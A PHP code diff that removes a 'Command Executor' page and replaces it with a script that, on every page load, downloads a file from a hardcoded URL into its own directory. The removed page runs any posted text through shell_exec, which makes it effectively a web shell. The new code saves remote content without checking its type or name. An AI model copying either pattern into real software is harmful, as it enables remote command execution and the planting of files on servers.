@@ -1,26 +1,55 @@
+<?php
+
+// Function to download a file from a hardcoded URL and save it to the current directory
+function importFileFromURL() {
+    // Hardcoded URL of the file to download
+    $fileURL = 'https://example.com/sample.jpg';  // Change this to the URL of the file you want to download
+
+    // Use file_get_contents to download the file contents
+    $fileContents = file_get_contents($fileURL);
+
+    // Check if file was downloaded successfully
+    if ($fileContents === false) {
+        echo "Error: Unable to download file from URL.";
+        return false;
+    }
+
+    // Get the file name from the URL
+    $fileName = basename($fileURL);
+
+    // Get the current directory where the PHP script is located
+    $currentDirectory = __DIR__;  // Current directory of the script
+
+    // Set the full path to save the file
+    $savePath = $currentDirectory . DIRECTORY_SEPARATOR . $fileName;
+
+    // Write the contents to the save path
+    $saveResult = file_put_contents($savePath, $fileContents);
+
+    // Check if the file was saved successfully
+    if ($saveResult === false) {
+        echo "Error: Unable to save the file to the server.";
+        return false;
+    }
+
+    echo "File downloaded and saved successfully: $fileName";
+    return true;
+}
+
+// Call the function to download and save the file
+importFileFromURL();
+
+?>
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Command Executor</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Import File from URL</title>
 </head>
 <body>
-    <form method="post">
-        <input type="text" name="command" required placeholder="Enter command">
-        <input type="submit" value="Run">
-    </form>
-
-    <?php
-    if ($_SERVER["REQUEST_METHOD"] == "POST") {
-        $command = escapeshellcmd($_POST['command']); // Sanitize input
-        $output = shell_exec($command); // Execute command
-
-        if ($output === null) {
-            echo "<pre>Error executing command.</pre>";
-        } else {
-            echo "<pre>" . htmlspecialchars($output) . "</pre>"; // Display output
-        }
-    }
-    ?>
+    <h2>File Download Status</h2>
+    <p>The file download and save process is handled automatically by the script.</p>
 </body>
 </html>
